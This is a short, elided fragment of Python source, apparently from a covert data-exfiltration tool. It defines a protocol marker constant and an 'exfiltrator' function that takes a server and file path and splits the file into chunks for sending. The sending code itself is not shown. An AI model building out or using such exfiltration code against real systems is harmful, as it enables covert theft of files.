...
MARKER = 16 * "\xff"                     # Marker This 16-octet field is included for compatibility; it MUST beset to all ones.
...
def exfiltrator(server, path_to_file, time_delay=0.1):
	...
	chunks = [exfil_me[i:i + MAX_LENGTH_SIZE] for i in range(0, len(exfil_me), MAX_LENGTH_SIZE)]  # Split into chunks
